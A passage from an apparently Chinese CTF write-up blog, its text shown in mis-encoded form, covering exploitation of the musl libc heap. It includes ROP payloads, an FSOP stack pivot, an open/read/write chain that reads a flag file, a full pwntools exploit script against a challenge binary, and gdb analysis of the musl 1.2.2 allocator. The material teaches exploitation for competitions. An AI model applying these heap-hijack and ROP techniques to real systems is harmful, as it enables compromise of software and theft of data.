chunk0åbinæŒ‡å‘äº†chunk0</p><p>chunk0çš„ä¸¤ä¸ªæŒ‡é’ˆåŸŸä¹ŸæŒ‡å‘äº†bin</p><p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210911221746016.png" alt="image-20210911221746016"></p><p>â‘¡uaf ä¿®æ”¹chunk0çš„ä¸¤ä¸ªæŒ‡é’ˆåŸŸ</p><p>nextè®¾ç½®ä¸ºbin-0x8</p><p>preè®¾ç½®ä¸ºç›®æ ‡åœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk = p64(mal+<span class="number">400</span>-<span class="number">0x18</span>) <span class="comment"># mal+376</span></span><br><span class="line">fake_chunk += p64(libc.sym[<span class="string">&#x27;__stdin_FILE&#x27;</span>]+<span class="number">0x40</span>) </span><br><span class="line">edit(<span class="number">0</span>,fake_chunk) </span><br></pre></td></tr></table></figure><p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210911222824673.png" alt="image-20210911222824673"></p><p>â‘¢æ ¹æ®binsçš„headå–å‡ºchunk0çš„ç©ºé—´ï¼Œä½œä¸ºchunk2</p><p>å¹¶è¿›è¡Œunlink</p><p>chunk0ï¼ˆchunk2ï¼‰çš„preï¼ˆå³ç›®æ ‡åœ°å€stdin_FILE+0x40ï¼‰ä½œä¸ºbinçš„æ–°head</p><p>åŒæ—¶ï¼Œç›®æ ‡åœ°å€stdin_FILE+0x40çš„fdè¢«å†™å…¥åŸchunk0çš„fd</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;B&#x27;</span>*<span class="number">0x100</span>)<span class="comment">#2 stdin_file </span></span><br></pre></td></tr></table></figure><p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210911222129217.png" alt="image-20210911222129217"></p><p>â‘£æ ¹æ®binsçš„headå–å‡ºstdin_FILE+0x40çš„ç©ºé—´ï¼Œä½œä¸ºchunk3</p><p>æˆåŠŸç”³è¯·åˆ°ç›®æ ‡åœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x30</span>+p64(libc.sym[<span class="string">&#x27;__stdout_FILE&#x27;</span>]+<span class="number">0x50</span>)+p64(ret)+p64(<span class="number">0</span>)+p64(mov_rdx) </span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(libc.sym[<span class="string">&#x27;__stdout_FILE&#x27;</span>])+p64(pop_rdx)+p64(<span class="number">0x500</span>)+p64(libc.sym[<span class="string">&#x27;read&#x27;</span>]) </span><br><span class="line">add(<span class="string">&#x27;C&#x27;</span>*<span class="number">0xb0</span>+payload)<span class="comment">#3</span></span><br></pre></td></tr></table></figure><p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210911222907607.png" alt="image-20210911222907607"></p><h3 id="ä»stdinæº¢å‡ºåˆ°stdout"><a href="#ä»stdinæº¢å‡ºåˆ°stdout" class="headerlink" title="ä»stdinæº¢å‡ºåˆ°stdout"></a><strong>ä»stdinæº¢å‡ºåˆ°stdout</strong></h3><p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210911174349792.png" alt="image-20210911174349792"></p><h3 id="ï¼ˆFSOPï¼‰ä¿®æ”¹-stdout-ä¸Šçš„å‡½æ•°æŒ‡é’ˆåŠ«æŒç¨‹åºæ§åˆ¶æµï¼Œè¿›è¡Œæ ˆè¿ç§»ROP"><a href="#ï¼ˆFSOPï¼‰ä¿®æ”¹-stdout-ä¸Šçš„å‡½æ•°æŒ‡é’ˆåŠ«æŒç¨‹åºæ§åˆ¶æµï¼Œè¿›è¡Œæ ˆè¿ç§»ROP" class="headerlink" title="ï¼ˆFSOPï¼‰ä¿®æ”¹ stdout ä¸Šçš„å‡½æ•°æŒ‡é’ˆåŠ«æŒç¨‹åºæ§åˆ¶æµï¼Œè¿›è¡Œæ ˆè¿ç§»ROP"></a><strong>ï¼ˆFSOPï¼‰ä¿®æ”¹ stdout ä¸Šçš„å‡½æ•°æŒ‡é’ˆåŠ«æŒç¨‹åºæ§åˆ¶æµï¼Œè¿›è¡Œæ ˆè¿ç§»ROP</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mov_rdx = libc.address+<span class="number">0x000000000004951a</span> </span><br><span class="line"><span class="comment">#    0x7f687c98751a &lt;longjmp+34&gt;:mov    rdx,QWORD PTR [rdi+0x30]</span></span><br><span class="line"><span class="comment">#    0x7f687c98751e &lt;longjmp+38&gt;:mov    rsp,rdx</span></span><br><span class="line"><span class="comment">#    0x7f687c987521 &lt;longjmp+41&gt;:mov    rdx,QWORD PTR [rdi+0x38]</span></span><br><span class="line"><span class="comment">#    0x7f687c987525 &lt;longjmp+45&gt;:jmp    rdx</span></span><br><span class="line">payload = <span class="string">&#x27;E&#x27;</span>*<span class="number">0x30</span></span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;__stdout_FILE&#x27;</span>]+<span class="number">0x50</span>)+p64(ret) <span class="comment">#0x30</span></span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(mov_rdx) <span class="comment">#0x40</span></span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(libc.sym[<span class="string">&#x27;__stdout_FILE&#x27;</span>])+p64(pop_rdx)+p64(<span class="number">0x500</span>)+p64(libc.sym[<span class="string">&#x27;read&#x27;</span>]) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak(<span class="string">&#x27;pop_rdi&#x27;</span>,pop_rdi)</span><br><span class="line">pause()</span><br><span class="line">add(<span class="string">&#x27;C&#x27;</span>*<span class="number">0xb0</span>+payload)<span class="comment">#3</span></span><br></pre></td></tr></table></figure><p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210911224458218.png" alt="image-20210911224458218"></p><p>è¿™æ ·å°±ä¼šæ‰§è¡Œgadget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mov    rdx,QWORD PTR [rdi+0x30] </span><br><span class="line"># å°†stdout_FILE+0x30åœ°å€ä¸Šçš„å†…å®¹ï¼ˆstdout_FILE+0x50ï¼‰æ”¾å…¥rdx </span><br><span class="line"># rdi:stdout_FILE+0x30 &#x2F;&#x2F; rdx:stdout_FILE+0x50</span><br><span class="line"></span><br><span class="line">mov    rsp,rdx  </span><br><span class="line"># æ ˆé¡¶æŒ‡å‘stdout_FILE+0x50ï¼ˆå­˜æ”¾äº†pop rdi gadgetåœ°å€ï¼‰</span><br><span class="line">#   rsp&#x3D;rdx:stdout_FILE+0x50</span><br><span class="line"></span><br><span class="line">mov    rdx,QWORD PTR [rdi+0x38] </span><br><span class="line"># å°†stdout_FILE+0x38åœ°å€ä¸Šçš„å†…å®¹ï¼ˆret gadgetåœ°å€ï¼‰æ”¾å…¥rdx</span><br><span class="line"># rdx: ret_addr</span><br><span class="line"></span><br><span class="line">jmp    rdx </span><br><span class="line"># è·³åˆ°ret gadgetåœ°å€ï¼Œæ‰§è¡Œpop rip</span><br><span class="line"># å°†æ ˆé¡¶çš„pop rdi gadgetåœ°å€å¼¹å‡ºå¹¶è·³è½¬æ‰§è¡Œ</span><br><span class="line"># ç»§ç»­ROPï¼Œæ‰§è¡Œå®Œread(0,addr,0x500)</span><br></pre></td></tr></table></figure><h3 id="æ‰§è¡Œ-orw-ROP-è¯»å–-flag"><a href="#æ‰§è¡Œ-orw-ROP-è¯»å–-flag" class="headerlink" title="æ‰§è¡Œ orw ROP è¯»å– flag"></a><strong>æ‰§è¡Œ orw ROP è¯»å– flag</strong></h3><p>å‘__stdout_FILEåœ°å€å†™å…¥å¦‚ä¸‹ï¼Œ</p><p>ä¸»è¦æ˜¯åœ¨__stdout_FILE+0x38å¤„å¼€å§‹å†™å…¥gadgetï¼Œå†æ¬¡ROP</p><p>å› ä¸ºæ‰§è¡ŒSYS_readåä¼šè·³è½¬åˆ°__stdout_FILE+0x38ä¸Šçš„åœ°å€ï¼ˆè°ƒè¯•å¾—åˆ°åç§» ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x38</span> </span><br><span class="line">payload += p64(pop_rdi)+p64(libc.sym[<span class="string">&#x27;__stdout_FILE&#x27;</span>]+<span class="number">0x100</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(libc.sym[<span class="string">&#x27;open&#x27;</span>]) </span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(libc.sym[<span class="string">&#x27;__stdout_FILE&#x27;</span>]+<span class="number">0x200</span>)+p64(pop_rdx) +p64(<span class="number">0x100</span>)+p64(libc.sym[<span class="string">&#x27;read&#x27;</span>]) </span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)+p64(libc.sym[<span class="string">&#x27;__stdout_FILE&#x27;</span>]+<span class="number">0x200</span>)+p64(pop_rdx) +p64(<span class="number">0x100</span>)+p64(libc.sym[<span class="string">&#x27;write&#x27;</span>]) </span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)+<span class="string">&quot;./flag\x00&quot;</span></span><br></pre></td></tr></table></figure><p>ç±»ä¼¼é¢˜ç›®è¿˜æœ‰ <a href="https://www.anquanke.com/post/id/202253#h3-11">2020 XCTF é«˜æ ¡æˆ˜â€œç–«â€ musl-master</a></p><p>å †æº¢å‡ºæ¼æ´ï¼ŒåŒæ ·æ˜¯åˆ©ç”¨unbinåŠ«æŒ</p><p>åªå†™åˆ°ç”³è¯·å‡ºstdinï¼Œåé¢æœ‰ç‚¹éº»çƒ¦ä¸æƒ³å†™äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;119.3.81.43&#x27;</span>, <span class="number">49153</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process([<span class="string">&quot;./libc.so&quot;</span>,<span class="string">&quot;./carbon&quot;</span>])</span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">choice</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,believer,content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;size? &gt;&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&#x27;believer? &gt;&#x27;</span>,<span class="built_in">str</span>(believer)) <span class="comment">#Y</span></span><br><span class="line">    sa(<span class="string">&#x27;sleeve &gt;&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;sleeve ID? &gt;&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sl(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;sleeve ID? &gt;&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;sleeve ID? &gt;&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">death</span>():</span></span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========================================================leak libc</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>) <span class="comment">#1 avoid consolidation</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x30</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>) <span class="comment">#5 avoid consolidation</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">mal = u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">24</span></span><br><span class="line">leak(<span class="string">&#x27;mal&#x27;</span>,mal)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line">libc.address = mal - <span class="number">0x292ac0</span></span><br><span class="line">leak(<span class="string">&#x27;libc.address&#x27;</span>,libc.address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># =========================================================hijack bin</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># overflow chunk4(in bin)</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0x41</span>)+p64(<span class="number">0xb40</span>)+p64(mal+<span class="number">880</span>)+p64(libc.sym[<span class="string">&#x27;__stdin_FILE&#x27;</span>]+<span class="number">0x40</span>)+<span class="string">&#x27;\n&#x27;</span>) <span class="comment">#3</span></span><br><span class="line"><span class="comment"># insert bin</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x30</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;g&#x27;</span>*<span class="number">0x30</span>) <span class="comment">#5 write stdin!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure><hr><h1 id="Version-1-2-2"><a href="#Version-1-2-2" class="headerlink" title="Version 1.2.2"></a>Version 1.2.2</h1><h2 id="ç¥¥äº‘æ¯-2021-babymull"><a href="#ç¥¥äº‘æ¯-2021-babymull" class="headerlink" title="ç¥¥äº‘æ¯_2021_babymull"></a><strong>ç¥¥äº‘æ¯_2021_babymull</strong></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">./libc.so</span> </span><br><span class="line">musl libc (x86_64)</span><br><span class="line">Version 1.2.2</span><br><span class="line">Dynamic Program Loader</span><br></pre></td></tr></table></figure><p><a href="http://pzhxbz.cn/?p=172">æ–°ç‰ˆmusl libc æµ…æ</a></p><p><a href="https://blog.csdn.net/easy_level1/article/details/118606424">[é˜…è¯»å‹]æ–°ç‰ˆmusl libc(1.2.2)å †ç®¡ç†ä¹‹æºç å‰–æï¼</a></p><p><a href="https://www.anquanke.com/post/id/241101#h2-5">å€ŸåŠ©DefCon Quals 2021çš„moooslå­¦ä¹ musl mallocngï¼ˆæºç å®¡è®¡ç¯‡ï¼‰</a></p><p>æœ¬é¢˜expå‚è€ƒ <a href="https://mp.weixin.qq.com/s/UwrZVlQ_WJ5rO4InOErt1g">ç¬¬äºŒå±Šâ€œç¥¥äº‘æ¯â€ç½‘ç»œå®‰å…¨å¤§èµ›å®˜æ–¹Writeup-Pwnç¯‡</a> </p><h3 id="é™æ€åˆ†æ-1"><a href="#é™æ€åˆ†æ-1" class="headerlink" title="é™æ€åˆ†æ"></a><strong>é™æ€åˆ†æ</strong></h3><p>ç¦ç”¨äº†execve</p><p>åªèƒ½åœ¨addå†™chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">manage_chunk</span>&#123;</span> # <span class="number">0x20</span></span><br><span class="line"><span class="keyword">char</span> name[<span class="number">0x10</span>];</span><br><span class="line"><span class="keyword">void</span> *chunk_ptr; # chunk_Size &lt;= <span class="number">0x1000</span></span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>chunk_ptræŒ‡é’ˆfreeåæ²¡ç½®0</p><p>æœ‰ä¸€æ¬¡showæœºä¼š</p><p>ä¸€æ¬¡åé—¨ï¼šå°†ä»»æ„ä¸€åœ°å€çš„å•å­—èŠ‚ç½®é›¶ï¼Œç„¶åæ³„éœ²ä»»æ„ä¸€åœ°å€çš„ 8 å­—èŠ‚ã€‚</p><p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/image-20210912182016284.png" alt="image-20210912182016284"></p><h3 id="gdbæŸ¥çœ‹æ•°æ®ç»“æ„"><a href="#gdbæŸ¥çœ‹æ•°æ®ç»“æ„" class="headerlink" title="gdbæŸ¥çœ‹æ•°æ®ç»“æ„"></a><strong>gdbæŸ¥çœ‹æ•°æ®ç»“æ„</strong></h3><p>å¯¹ç€ä¸‹å›¾ä»å¤´å¼€å§‹ä¸€ä¸ªä¸ªåˆ†æç»“æ„</p><p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/t015d8a64ff8626cf0d.png" alt="img"></p><h4 id="malloc-context"><a href="#malloc-context" class="headerlink" title="__malloc_context"></a><strong>__malloc_context</strong></h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p __malloc_context</span><br><span class="line"><span class="variable">$1</span> = &#123;</span><br><span class="line">  secret = <span class="number">13395722478044406582</span>, </span><br><span class="line">  init_done = <span class="number">1</span>, </span><br><span class="line">  mmap_counter = <span class="number">0</span>, </span><br><span class="line">  free_meta_head = <span class="number">0</span>x0, </span><br><span class="line">  avail_meta = <span class="number">0</span>x5555560cc1f8,  <span class="comment">#meta_areaä¸­ç®¡ç†çš„ç©ºé—²çš„metaé¦–åœ°å€ï¼Œç”¨avail_meta_countè¡¨ç¤ºæ•°é‡</span></span><br><span class="line">  avail_meta_count = <span class="number">89</span>, </span><br><span class="line">  avail_meta_area_count = <span class="number">0</span>, </span><br><span class="line">  meta_alloc_shift = <span class="number">0</span>, </span><br><span class="line">  meta_area_head = <span class="number">0</span>x5555560cc000, </span><br><span class="line">  meta_area_tail = <span class="number">0</span>x5555560cc000, </span><br><span class="line">  avail_meta_areas = <span class="number">0</span>x5555560cd000 &lt;error: Cannot access memory at address <span class="number">0</span>x5555560cd000&gt;, </span><br><span class="line">  active = &#123;<span class="number">0</span>x0 &lt;repeats <span class="number">11</span> times&gt;, <span class="number">0</span>x5555560cc090, <span class="number">0</span>x0, <span class="number">0</span>x0, <span class="number">0</span>x0, <span class="number">0</span>x5555560cc068, <span class="number">0</span>x0, <span class="number">0</span>x0, <span class="number">0</span>x0, <span class="number">0</span>x5555560cc040, <span class="number">0</span>x0, <span class="number">0</span>x0, <span class="number">0</span>x0, <span class="number">0</span>x5555560cc018, <span class="number">0</span>x0 &lt;repeats <span class="number">24</span> times&gt;&#125;, </span><br><span class="line">  <span class="comment"># å †ç®¡ç†å™¨ä¾æ®ç”³è¯·çš„sizeï¼Œå°†chunkåˆ†æˆ48ç±»chunkã€‚ç¼“å­˜å¯ç»§ç»­åˆ†é…çš„metaï¼Œæ•°ç»„ä¸‹æ ‡ä¸å¤§å°æœ‰å…³ã€‚</span></span><br><span class="line">  usage_by_class = &#123;<span class="number">0</span> &lt;repeats <span class="number">48</span> times&gt;&#125;, <span class="comment"># å¯¹åº”å¤§å°çš„ç¼“å­˜çš„æ‰€æœ‰metaçš„groupæ‰€ç®¡ç†çš„chunkä¸ªæ•°ã€‚</span></span><br><span class="line">  unmap_seq = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">31</span> times&gt;, </span><br><span class="line">  bounces = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">31</span> times&gt;, </span><br><span class="line">  seq = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">  brk = <span class="number">93825004261376</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p &amp;__malloc_context</span><br><span class="line"><span class="variable">$2</span> = (struct malloc_context *) <span class="number">0</span>x7f952e19cb60 &lt;__malloc_context&gt;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | <span class="keyword">DATA</span> | RWX | RODATA</span><br><span class="line">......</span><br><span class="line">    <span class="number">0</span>x7f952e19c000     <span class="number">0</span>x7f952e19d000 rw<span class="literal">-p</span>     <span class="number">1000</span> <span class="number">98000</span>  /home/wendy/Desktop/xyb/babymull/libc.so</span><br><span class="line">......</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>__malloc_context</code>æ˜¯musl libcçš„å…¨å±€ç®¡ç†ç»“æ„æŒ‡é’ˆ,ç›¸å½“äºmain_arenaï¼Œå­˜æ”¾åœ¨libc.soçš„bssæ®µ</p><p><code>active = &#123;0x0 &lt;repeats 11 times&gt;, 0x5555560cc090,0...</code>ï¼šå †ç®¡ç†å™¨ä¾æ®ç”³è¯·çš„sizeï¼Œå°†chunkåˆ†æˆ48ç±»chunkï¼Œç”±sizeclassæŒ‡å®šã€‚æ¯ç±»chunkç”±ä¸€ä¸ªmetaç»“æ„ç®¡ç†ï¼Œmetaç®¡ç†çš„chunkä¸ªæ•°æœ‰é™ï¼Œç”±<code>small_cnt_tab</code>æŒ‡å®šã€‚å½“ç”³è¯·ä¸ªæ•°è¶…å‡ºä¸€ä¸ªmetaæ‰€èƒ½ç®¡ç†çš„æœ€å¤§æ•°é‡ï¼Œå †ç®¡ç†å™¨ä¼šå†ç”³è¯·åŒç±»å‹metaç®¡ç†æ›´å¤šçš„chunkï¼Œå¹¶ä¸”ä»¥åŒå‘é“¾è¡¨ç»“æ„ç®¡ç†è¿™äº›ç›¸åŒç±»å‹çš„metaã€‚<br><code>usage_by_class = &#123;0 &lt;repeats 48 times&gt;&#125;</code>ï¼šè¡¨ç¤ºå½“å‰å„metaç®¡ç†ç€çš„chunkä¸ªæ•°ã€‚</p><h4 id="ç”³è¯·-chunkåçš„malloc-contextå˜åŒ–"><a href="#ç”³è¯·-chunkåçš„malloc-contextå˜åŒ–" class="headerlink" title="ç”³è¯· chunkåçš„malloc_contextå˜åŒ–"></a><strong>ç”³è¯· chunkåçš„malloc_contextå˜åŒ–</strong></h4><p>è¿™é‡Œç›´æ¥ç”¨è¿™é¢˜åšæµ‹è¯•ï¼Œadd 0x20ä¸¤æ¬¡ï¼Œç›¸å½“äºç”³è¯·äº†4ä¸ª0x30çš„chunk</p><p>ç”¨æˆ·ç”³è¯·ç©ºé—´ä¹‹åï¼Œæ‰æœ‰äº†metaé¡µæ¥å¯¹chunkè¿›è¡Œç®¡ç†</p><p>åŒæ—¶malloc_contextçš„activeæ•°ç»„å¯¹åº”å…ƒç´ ä¼šæŒ‡å‘metaåœ°å€</p><p>usage_by_classæ•°ç»„ä¼šæ˜¾ç¤ºè¯¥metaçš„æ¯groupå¯ç®¡ç†chunkçš„æœ€å¤šæ•°é‡</p><p><img src="/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/%E6%97%A0%E6%A0%87%E9%A2%98.png" alt="æ— æ ‡é¢˜"></p><h4 id="metaç»“æ„ä½“"><a href="#metaç»“æ„ä½“" class="headerlink" title="metaç»“æ„ä½“"></a><strong>metaç»“æ„ä½“</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span> <span class="comment">// metaæ˜¯ä¸€ä¸ªåŒå‘é“¾è¡¨</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span 